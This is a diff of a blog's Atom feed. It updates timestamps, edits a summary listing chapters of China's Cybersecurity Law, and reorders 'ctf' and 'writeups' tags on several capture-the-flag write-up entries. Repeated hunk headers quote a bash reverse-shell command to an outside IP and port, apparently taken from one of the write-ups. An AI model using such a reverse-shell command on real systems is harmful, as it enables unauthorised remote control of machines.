@@ -5,7 +5,7 @@
   <link href="/feed.xml" rel="self"/>
   
   <link href="https://www.virzz.com/"/>
-  <updated>2017-06-01T12:39:22.000Z</updated>
+  <updated>2017-06-01T13:01:21.000Z</updated>
   <id>https://www.virzz.com/</id>
   
   <author>
@@ -20,18 +20,18 @@
     <link href="https://www.virzz.com/2017/06/01/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95.html"/>
     <id>https://www.virzz.com/2017/06/01/中华人民共和国网络安全法.html</id>
     <published>2017-06-01T12:24:38.000Z</published>
-    <updated>2017-06-01T12:39:22.000Z</updated>
+    <updated>2017-06-01T13:01:21.000Z</updated>
     
     <summary type="html">
     
-      &lt;h1&gt;中华人民共和国网络安全法&lt;/h1&gt;
-&lt;h2&gt;目录&lt;/h2&gt;
+      &lt;h2&gt;目录&lt;/h2&gt;
 &lt;ul&gt;
 &lt;li&gt;第一章 总 则&lt;/li&gt;
 &lt;li&gt;第二章 网络安全支持与促进&lt;/li&gt;
 &lt;li&gt;第三章 网络运行安全&lt;/li&gt;
 &lt;li&gt;第一节 一般规定&lt;/li&gt;
-&lt;li&gt;第二节 关键信息基础设施的运行安全&lt;/
+&lt;li&gt;第二节 关键信息基础设施的运行安全&lt;/li&gt;
+&lt;li&gt;第四章 网络信息安全&lt;/li
     
     </summary>
     
@@ -100,9 +100,9 @@ If you see &lt;a href=&quot;http://app.py
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
@@ -194,9 +194,9 @@ if (isset($_COOKIE[&amp;quot
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
@@ -688,9 +688,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
@@ -711,9 +711,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
@@ -733,9 +733,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
@@ -756,9 +756,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
@@ -780,9 +780,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
@@ -803,9 +803,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
@@ -845,9 +845,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
@@ -869,9 +869,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
